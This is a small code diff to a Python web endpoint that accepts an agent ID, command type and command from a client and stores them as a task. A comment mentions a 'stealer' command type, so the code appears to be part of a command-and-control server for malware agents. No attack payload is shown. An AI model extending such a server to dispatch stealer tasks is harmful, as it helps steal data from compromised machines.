@@ -10,10 +10,11 @@ def task_create():
     """
     Parse Task sent by client, and stroe it to database
     """
-    # data = request.json
+    data = request.json
     agent_id = request.form.get('agent_id')
     command_type = request.form.get("command_type")
     cmd = request.form.get("cmd")
+
     print("data:", agent_id, command_type, cmd)
     if agent_id == None or command_type == None: ## cmd CAN be NONE for stealer
         return jsonify({"status": "error: no data"})
